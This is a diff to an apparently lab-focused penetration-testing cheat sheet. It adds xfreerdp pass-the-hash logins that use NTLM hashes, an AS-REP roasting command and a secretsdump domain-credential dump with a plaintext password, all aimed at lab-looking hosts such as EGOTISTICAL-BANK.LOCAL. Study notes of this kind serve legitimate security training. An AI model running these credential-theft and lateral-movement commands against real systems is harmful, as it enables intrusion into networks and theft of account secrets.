@@ -404,6 +404,10 @@ xfreerdp /u:uname /p:'pass' /v:IP
 xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
 xfreerdp /u:uname /p:'pass' /v:IP +clipboard #try this option if normal login doesn't work
 xfreerdp /u:Administrator /d:target.local /pth:aad3b435b51404eeaad3b435b51404ee:d958f23d92281df0b62a6d7e9f42ee88 /v:192.168.43.9
+# <LM:NTLM>
+xfreerdp /u:joe /pth:08d7a47a6f9f66b97b1bae4178747494 /v:172.16.162.11
+proxychains xfreerdp /u:leon /pth:2e208ad146efda5bc44869025e06544a /d:medtech.com /v:172.16.235.10
+
 ```
 
 ## Adding SSH Public key
@@ -560,6 +564,7 @@ secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Du
 GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS
 
 GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list
+#python3 GetNPUsers.py EGOTISTIAL-BANK.LOCAL/ -no-pass -usersfile /home/hacker/userslist.txt -dc-ip 10.10.10.175
 
 ##RCE
 psexec.py test.local/john:password123@10.10.10.1
@@ -1829,6 +1834,8 @@ ps> iwr -UseDefaultCredentials <servicename>://<computername>
 secretsdump.py <domain>/<user>:<password>@<IP>
 secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
 secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
+
+#python3 secretsdump.py -just-dc EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175
 ```
 
 ### Dumping NTDS.dit
